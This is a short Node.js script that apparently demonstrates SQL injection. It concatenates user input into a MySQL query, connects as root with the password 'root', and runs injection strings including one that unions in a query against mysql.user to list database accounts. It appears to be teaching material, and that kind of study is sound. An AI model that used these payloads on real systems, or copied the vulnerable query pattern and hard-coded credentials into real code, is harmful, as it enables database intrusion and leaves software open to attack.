import mysql from 'mysql2/promise'

// create the connection to database
const connection = await mysql.createConnection({
	host: '127.0.0.1',
  database: 'conn_db',
  user: 'root',
  password: 'root',
})

// naive query
let queryString = 'select last_name from students where email='

let regularUserInput = 'jane@etc.com'

let hostileUserInput1 = "' or 1=1;#"
let hostileUserInput2 = "' or 1=1 union select user from mysql.user;#"

let [rows, _] = await connection.query(queryString + "'" + hostileUserInput2 + "'")
// let [rows, _] = await connection.query(queryString + "'" + regularUserInput + "'")
console.warn(rows)

await connection.destroy( )

// query execution
